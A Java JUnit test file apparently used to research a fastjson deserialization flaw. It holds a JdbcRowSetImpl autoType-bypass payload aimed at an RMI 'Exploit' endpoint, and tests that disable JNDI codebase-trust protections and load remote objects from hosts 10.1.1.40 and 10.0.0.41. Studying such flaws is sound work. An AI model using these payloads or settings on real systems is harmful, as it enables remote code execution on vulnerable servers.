package fastjson;

import com.alibaba.fastjson.JSON;
import org.junit.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;

/**
 * @author jiangxinjun
 * @date 2019/07/22
 */
public class FastJSONTest {

    @Test
    public void testParseObject() {
        String jsonstr = "{\"@type\":\"com.wjh.common.message.fastjson.User\", \"name\":\"Tom\", \"age\": 13, \"prop\": {}, \"sex\": 1}";
        Object obj = JSON.parseObject(jsonstr, User.class);
        System.out.println(obj);
    }

    @Test
    public void testParseObjectWithPoc() {
        //String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";
        String payload = "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }

    @Test
    public void testJNDI() throws NamingException {
        System.out.println(System.setProperty("java.rmi.server.useCodebaseOnly", "false"));
        System.out.println(System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"));
        System.out.println(System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true"));
        System.out.println(System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true"));
        System.out.println(System.setProperty("java.rmi.server.codebase", "http://10.0.0.41/"));
        System.setProperty("java.rmi.server.hostname","10.1.1.40");

        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://10.1.1.40:1099");
        Context ctx = new InitialContext(env);
        Object local_obj = ctx.lookup("rmi://10.1.1.40:1099/Exploit");
        System.out.println(local_obj);
        Object local_obj2 = ctx.lookup("rmi://10.1.1.40:1099/Exploit2");
        System.out.println(local_obj2);
    }

    @Test
    public void testExec() throws Exception {
        //System.out.println(ExploitFactory.exec("java -version"));
    }

    @Test
    public void testTomcat() throws NamingException {
        Context ctx = new InitialContext();
        Object local_obj = ctx.lookup("rmi://10.1.1.40:1099/Exploit");
        System.out.println(local_obj);
    }


}
